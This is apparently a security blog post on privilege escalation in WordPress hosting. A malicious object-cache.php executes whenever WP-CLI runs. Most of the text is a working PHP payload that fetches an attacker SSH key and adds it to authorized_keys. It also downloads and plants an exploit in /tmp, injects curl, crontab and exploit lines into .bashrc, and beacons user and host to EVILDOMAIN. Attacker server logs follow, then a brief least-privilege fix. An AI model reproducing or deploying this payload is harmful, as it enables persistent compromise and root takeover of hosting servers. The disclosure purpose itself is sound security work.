# Attacking hosting infrastructure through WP-CLI

WP-CLI[1] is the command-line interface for WordPress, as their site claims. It gives an interface to functionality of WordPress. This is quiet cool and is used by a lot of (WordPress) hosting companies to troubleshoot and support their customers. 

An example:

``` 
$ wp-cli.phar core version 
4.8.1
$ wp-cli.phar plugin list
+----------------------------+----------+-----------+----------+
| name                       | status   | update    | version  |
+----------------------------+----------+-----------+----------+
| advanced-custom-fields     | active   | none      | 4.4.11   |
| display-widgets            | active   | available | 2.6.2.1  |
| regenerate-thumbnails      | inactive | none      | 2.2.6    |
| simple-share-buttons-adder | inactive | none      | 6.3.6    |
| wordpress-seo              | active   | available | 5.3.1    |
+----------------------------+----------+-----------+----------+
$ wp-cli.phar checksum core --skip-themes --skip-plugins 
Success: WordPress install verifies against checksums.
```

WP-CLI is a phar and uses the system PHP and php.ini-settings to execute WordPress to get the WordPress installation settings. This means there is code execution of code that are placed within in WordPress files. Within the example we do a checksum on the WordPress core files to check the integrety. This is a really cool feature to check for infections. We use the `--skip-themes` and `--skip-plugins` arguments to skip the code of any plugins and themes. 

As a serious hosting company you might choose to disable the execution of system commands and process calls. This makes it a lot harder for attackers to compromise the system. So what to do when you have access to a WordPress installation and want to escalate privileges to someone with more than just a sandboxed PHP proces?

This is where the optional file wp-content/object-cache.php comes in. This file is not part of WordPress core but it loaded on startup by wp-includes/load.php:

wp-includes/load.php [2]
```
function wp_start_object_cache() {
	global $wp_filter;
	$first_init = false;
 	if ( ! function_exists( 'wp_cache_init' ) ) {
		if ( file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
			require_once ( WP_CONTENT_DIR . '/object-cache.php' );
			if ( function_exists( 'wp_cache_init' ) ) {
				wp_using_ext_object_cache( true );
			}
			// Re-initialize any hooks added manually by object-cache.php
			if ( $wp_filter ) {
				$wp_filter = WP_Hook::build_preinitialized_hooks( $wp_filter );
			}
		}
		$first_init = true;
	} elseif ( ! wp_using_ext_object_cache() && file_exists( WP_CONTENT_DIR . '/object-cache.php' ) ) {
<snip>
```

Although this code should not be trusted by default it is. And so this is a nice attack vector. Anyony that executes wp-cli-phar in this installation will execute the code in object-cache.php by default. So let's see how we could use this. 

Let's setup an imaginary hosting environment:
- Any webserver, SQL server etc you wish
- PHP-FPM configured with a php.ini that disables 
	- proc_open
	- popen
	- system
	- show_source
	- dl
	- shell_exec
	- passthru
	- proc_terminate
	- proc_close
	- proc_get_status
	- proc_nice
	- pclose 
	- posix_kill
	- posix_mkfifo
	- posix_setpgid
	- posix_setsid	
	- posix_setuid
	- posix_getpwuid
	- posix_uname
-The PHP-FPM process will run as a non-priviliged user with a /sbin/nologin shell.


Although the execution of PHP (and so wp-cli.phar) will have no way to execute system binaries or scripts other than PHP. To attack the user of wp-cli.phar (which might be a supportdesk employee or a cronjob running `wp-cli.phar core update`) we could insert the following code in wp-content/object-cache.php:

```
<?php    
	@$uid = posix_getuid();
	if( isset($uid) and $uid == 0) {
		// in the off change that someone forces wp-cli to run as uid 0
		$user = 'root';
        	$keyfile = '/root/.ssh/authorized_keys';
		$bashrc = '/root/.bashrc';
	} else {
		@$user = posix_getlogin();
        	@$keyfile = '/home/'.posix_getlogin().'/.ssh/authorized_keys';
		$bashrc = '/home/'.$user.'/.bashrc';
        }
	// return to wp-includes if webserver is serving file, this is because we have no login
	if($user == '') {return;} 
	
	// download and add our key to the users authorized_keys
        @$c = curl_init("http://EVILDOMAIN/sshkey.pub");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
	@$current = file_get_contents($keyfile);
        $current .= "\n".$t;
	@file_put_contents($keyfile,$current);
	@chmod($file, 0600);

	// download exploit and install it in /tmp/.exploit
        @$c = curl_init("http://EVILDOMAIN/exploit");
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t = curl_exec($c);
	@curl_close($c);
	@$payload = fopen('/tmp/.exploit', "w+");
	@fputs($payload, $t);
	@fclose($payload);
        @chmod('/tmp/.exploit', 0700);

	// Now we add cronjob insertion into the bashrc of the user running the wp-cli.phar
	// so the next time the user logs into the server the cronjob gets inserted and the 
	// exploit is executed.
	@$bashrcold = file_get_contents($bashrc);
	@$bashrcold .= "\ncurl -s http://EVILDOMAIN/sshkey.pub?".$user."@".gethostname()." -o /tmp/.sshkey.pub 2>&1 > /dev/null;";
	@$bashrcold .= "\ncrontab /tmp/.cronfile 2>&1 > /dev/null;";
	@$bashrcold .= "\n/tmp/.exploit";
	@file_put_contents($bashrc,$bashrcold);
        
	@file_put_contents('/tmp/.cronfile', "SHELL=/bin/bash\nMAIL=\"\"\n\n*37 13 * * * /tmp/.exploit\n");

	// we do a GET on EVILDOMAIN to inform us which username and host to SSH into with our ssh key
	@$c = curl_init("http://EVILDOMAIN/?".$user."@".gethostbyaddr("127.0.1.1"));
        @curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	@curl_setopt($c, CURLOPT_HEADER, 0);
       	@$t= curl_exec($c);
        @curl_close($c);
```

If this were inside object-cache.php and we would run this as a supportdesk account we see the following:
```
$ wp-cli.phar plugin list --skip-plugins --skip-themes
+-------------------------------+----------+--------+---------+
| name                          | status   | update | version |
+-------------------------------+----------+--------+---------+
| grid                          | active   | none   | 1.6.13  |
| instagram-feed                | active   | none   | 1.4.9   |
| nextgen-gallery               | active   | none   | 2.2.10  |
| pace-builder                  | active   | none   | 1.1.6   |
+-------------------------------+----------+--------+---------+
```
So, we see nothing at all, but in the meantime on EVILDOMAIN's webserver we see the following in the logs:
```
root@EVILDOMAIN:/var/log/apache2/# tail -f access.log 
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:55] "GET /sshkey.pub HTTP/1.1" 200 -
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /sskey.pub HTTP/1.1" 200 -
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /exploit HTTP/1.1" 200 -
xxx.xx.xxx.xx - - [04/Jul/2017 14:55:58] "GET /?xxxxx@xxxx.xxxx.com HTTP/1.1" 200 -
```

On the hosting machine:
```
$ tail -n 3 ~/.bashrc 
curl -s http://EVILDOMAIN/sshkey.pub?xxxx@xxxx.xxxx.com -o /tmp/.sshkey.pub 2>&1 > /dev/null;
crontab /tmp/.cronfile 2>&1 > /dev/null;
/tmp/.exploit
```

If this user logs into the system again the user executes the cronjob is inserted as the user and the exploit is executed. Now this is really, really interesting if the webhoster does updates of WordPress core through a cronjob:
```
* 0 * * * wp-cli.phar plugin update --all && chown webuser:webuser httpdocs/
```
This would give us code execution for the user root on the webserver

Solving this issue is easy. Always use the concept of least privilege. If you force the use of the non-privileged webuser misuse wil be prevented:
``` sudo -u webuser wp-cli.phar plugin list```


[1] http://wp-cli.org/
[2] https://github.com/WordPress/WordPress/blob/795af804ba83ab4ecb36477ced49980cf9f117f2/wp-includes/load.php#L474
